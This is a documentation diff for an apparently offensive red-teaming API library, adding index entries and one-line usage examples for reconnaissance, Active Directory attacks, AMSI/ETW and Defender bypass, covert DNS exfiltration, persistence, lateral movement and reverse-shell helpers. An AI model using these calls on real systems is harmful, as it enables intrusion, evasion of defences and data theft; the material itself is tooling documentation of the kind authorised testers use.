@@ -6,10 +6,16 @@ OFX provides comprehensive red teaming APIs to reduce scripting overhead by 80-9
 
 ## Quick Navigation
 
-- **[Reconnaissance APIs](reconnaissance.md)** - Search engines, OOB testing, network scanning, HTTP server
-- **[Exploitation APIs](exploitation.md)** - HTTP client, shellcode generation, webshells, binary exploitation  
+- **[Reconnaissance APIs](reconnaissance.md)** - Search engines (Shodan/FOFA/ZoomEye), OOB testing, HTTP server
+- **[Recon API](recon.md)** - Async port scanning, crt.sh OSINT, web fingerprinting
+- **[Active Directory API](ad.md)** - BloodHound, Kerberos attacks, DCSync, password spray
+- **[Exploitation APIs](exploitation.md)** - HTTP client, shellcode generation, webshells, binary exploitation
 - **[Post-Exploitation APIs](post-exploitation.md)** - File operations, utilities, data manipulation, credential helpers
-- **[Evasion APIs](evasion.md)** - Payload obfuscation, command evasion
+- **[Evasion APIs](evasion.md)** - AMSI/ETW bypass, Defender disabling, payload obfuscation
+- **[OPSEC API](opsec.md)** - Proxy config, cleanup, timing, traffic blending
+- **[Privesc API](privesc.md)** - Linux and Windows local privilege escalation checks
+- **[Exfil API](exfil.md)** - DNS tunnelling, chunked HTTP, compress+encrypt pipeline
+- **[Bundle API](bundle.md)** - Package, obfuscate, and deliver scripts to remote targets
 - **Module sheets:** [DNS](dns.md) · [Service](service.md) · [Payloads](payloads.md) · [Packers](packers.md) · [Lateral](lateral.md) · [Persistence](persistence.md) · [C2](c2.md) · [Data](data.md) · [Loot](loot.md)
 
 ## Categories
@@ -65,13 +71,34 @@ File operations, process management, cryptography, and credential handling.
 |-----|---------|---------|
 | **file** | File operations | `file.read_file(path)` |
 | **post** | Post-exploitation helpers | `post.detect_os(uname)` |
-| **evasion** | [Evasion helpers](evasion.md) | `evasion.obfuscate_payload(code)` |
+| **evasion** | [Evasion helpers](evasion.md) | `evasion.amsi_bypass()` |
 | **creds** | Credential helpers | `creds.ExegolHistoryDB()` |
 | **lateral** | Copy+execute via runners | `lateral.copy_and_exec('10.0.0.5', 'beacon.exe', 'C:\\Temp\\b.exe', method='smbexec')` |
-| **persistence** | Build schtasks/service/runkey commands | `persistence.schtask_command('Updater', 'C:\\Temp\\b.exe')` |
-| **c2** | Shell/listener snippets | `c2.bash_reverse_shell('10.0.0.1', 4444)` |
+| **persistence** | Windows + Linux persistence commands | `persistence.crontab_command('/tmp/implant.sh')` |
+| **c2** | Shell/listener/stager snippets | `c2.socat_reverse_shell('10.0.0.1', 4444)` |
 | **data** | Archive/split staging | `data.archive_path('/tmp/loot')` |
 | **loot** | Loot discovery utilities | `loot.find_minidumps('/mnt/share')` |
+
+### :material-shield-lock: OPSEC & Evasion
+
+| API | Purpose | Example |
+|-----|---------|---------|
+| **opsec** | [OPSEC helpers](opsec.md) | `opsec.clean_history_commands()` |
+| **evasion** | [AV/EDR bypass](evasion.md) | `evasion.amsi_bypass('patch_bytes')` |
+| **exfil** | [Covert exfiltration](exfil.md) | `exfil.dns_exfil_commands(data, domain)` |
+
+### :material-elevation-rise: Privilege Escalation
+
+| API | Purpose | Example |
+|-----|---------|---------|
+| **privesc** | [Linux & Windows privesc](privesc.md) | `privesc.suid_commands()` |
+| **ad** | [Active Directory attacks](ad.md) | `ad.kerberoast_command(domain='corp.local')` |
+
+### :material-package-variant: Delivery
+
+| API | Purpose | Example |
+|-----|---------|---------|
+| **bundle** | [Package, obfuscate, deliver](bundle.md) | `bundle.run_remote(script, runner)` |
 -->
 
 ### :material-lan: Network
